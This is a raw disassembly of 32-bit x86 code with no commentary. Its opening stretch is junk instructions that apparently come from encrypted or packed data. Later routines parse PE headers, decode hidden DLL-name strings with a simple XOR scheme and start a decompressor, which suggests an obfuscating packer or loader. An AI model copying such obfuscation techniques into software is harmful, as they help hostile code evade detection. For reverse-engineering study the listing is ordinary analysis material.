  41f742:	and    BYTE PTR [ecx],0xef
  41f745:	inc    edx
  41f746:	loop   0x41f74e
  41f748:	xchg   edi,eax
  41f749:	mov    edx,0xed3fae34
  41f74e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f74f:	inc    ebx
  41f750:	xchg   esi,esp
  41f752:	inc    ebp
  41f753:	push   ebp
  41f754:	fst    QWORD PTR [esi-0x55d03364]
  41f75a:	lds    edx,FWORD PTR [ebx+edx*1]
  41f75d:	add    DWORD PTR [ebp+edi*4+0x37356651],ecx
  41f764:	cmc    
  41f765:	pop    eax
  41f766:	shl    DWORD PTR [edx+0x144ea9a2],0x50
  41f76d:	(bad)  
  41f76e:	fidiv  DWORD PTR [edi]
  41f770:	cli    
  41f771:	cs xchg edx,eax
  41f773:	js     0x41f7b3
  41f775:	mov    edx,0xe59ddecd
  41f77a:	enter  0x16ae,0x1a
  41f77e:	int3   
  41f77f:	push   cs
  41f780:	leave  
  41f781:	pop    ds
  41f782:	adc    al,0xea
  41f784:	out    dx,al
  41f785:	sar    ebx,0x95
  41f788:	mov    esi,0x1bf3041a
  41f78d:	xchg   edi,eax
  41f78e:	mov    ?,WORD PTR [edi]
  41f790:	inc    esi
  41f791:	ins    BYTE PTR es:[edi],dx
  41f792:	xor    DWORD PTR [edx-0x2d5fb26c],0xd579ab5e
  41f79c:	(bad)  
  41f79e:	jb     0x41f767
  41f7a0:	test   dh,0x93
  41f7a3:	push   ss
  41f7a4:	mov    ebp,0xa78051c3
  41f7a9:	sub    eax,0xe805ecff
  41f7ae:	or     BYTE PTR es:[edi-0x3],dl
  41f7b2:	addr16 dec edi
  41f7b4:	mov    ?,WORD PTR [eax+0x20]
  41f7b7:	jnp    0x41f7a2
  41f7b9:	push   edi
  41f7ba:	sbb    al,0x2d
  41f7bc:	or     al,0x66
  41f7be:	sti    
  41f7bf:	inc    ebx
  41f7c0:	pop    esp
  41f7c1:	leave  
  41f7c2:	outs   dx,DWORD PTR ds:[esi]
  41f7c3:	mov    edi,0x8027d67
  41f7c8:	cdq    
  41f7c9:	xor    edi,DWORD PTR [eax+0x34]
  41f7cc:	loopne 0x41f7b1
  41f7ce:	jecxz  0x41f7a1
  41f7d0:	jbe    0x41f7c9
  41f7d2:	adc    ah,bh
  41f7d4:	mov    dh,BYTE PTR [edi-0x61]
  41f7d7:	sti    
  41f7d8:	mov    BYTE PTR ds:0xa654c8cc,0x45
  41f7df:	icebp  
  41f7e0:	pop    ecx
  41f7e1:	or     esp,eax
  41f7e3:	aad    0x67
  41f7e5:	ret    
  41f7e6:	xlat   BYTE PTR ds:[ebx]
  41f7e7:	add    al,0xf5
  41f7e9:	out    0x30,al
  41f7eb:	mov    ebx,0x4f63f726
  41f7f0:	jb     0x41f821
  41f7f2:	lock (bad) 
  41f7f4:	or     al,0x12
  41f7f6:	out    dx,eax
  41f7f7:	jo     0x41f7bd
  41f7f9:	loope  0x41f7fe
  41f7fb:	les    ecx,FWORD PTR [ebp-0x4c410d7f]
  41f801:	mov    esp,0xf2dbea0e
  41f806:	or     DWORD PTR [ecx+0x1d1dc9ee],ecx
  41f80c:	xchg   edi,eax
  41f80d:	addr16 dec esp
  41f80f:	jecxz  0x41f881
  41f811:	scas   al,BYTE PTR es:[edi]
  41f812:	pop    ds
  41f813:	clc    
  41f814:	xchg   di,ax
  41f816:	mov    ds:0x4f440144,al
  41f81b:	sbb    al,0xd9
  41f81d:	(bad)  
  41f81e:	adc    eax,0x4f930e79
  41f823:	les    edx,FWORD PTR [ecx+ebp*8]
  41f826:	and    edi,DWORD PTR [esi+0x78495fae]
  41f82c:	(bad)  
  41f82d:	jmp    0xd259:0x23cd8d50
  41f834:	pop    ds
  41f835:	and    cl,BYTE PTR [ecx-0x3b872ddb]
  41f83b:	out    dx,al
  41f83c:	bound  ebx,QWORD PTR [ebp+0x39bf867a]
  41f842:	(bad)  
  41f843:	jmp    0x1140:0x2d25c3a3
  41f84a:	cmc    
  41f84b:	sbb    ebx,DWORD PTR [edi-0x9]
  41f84e:	sub    BYTE PTR [eax+ebp*2+0x1f7f198f],al
  41f855:	loopne 0x41f819
  41f857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f858:	pop    esp
  41f859:	addr16 mov al,ds:0x4697
  41f85d:	es push 0x77
  41f860:	cmovns ebx,DWORD PTR [ebx]
  41f863:	mov    ds:0x7a095782,al
  41f868:	fst    QWORD PTR [edx+ecx*4+0x71]
  41f86c:	add    bl,BYTE PTR [ebx-0xd84c55a]
  41f872:	cmp    esi,edi
  41f874:	sub    BYTE PTR [edx+0x3272fa],bh
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429ec5
  41f8e9:	mov    edx,DWORD PTR ds:0x42af1d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x42fa00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x42fa40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	push   esp
  41faa5:	xchg   ecx,eax
  41faa6:	adc    al,0x72
  41faa8:	dec    ebx
  41faa9:	xor    DWORD PTR [ecx+0x2a55944d],esi
  41faaf:	pxor   mm0,QWORD PTR [esi+0x1e09c]
  41fab6:	add    BYTE PTR [eax],al
  41fab8:	inc    ebx
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
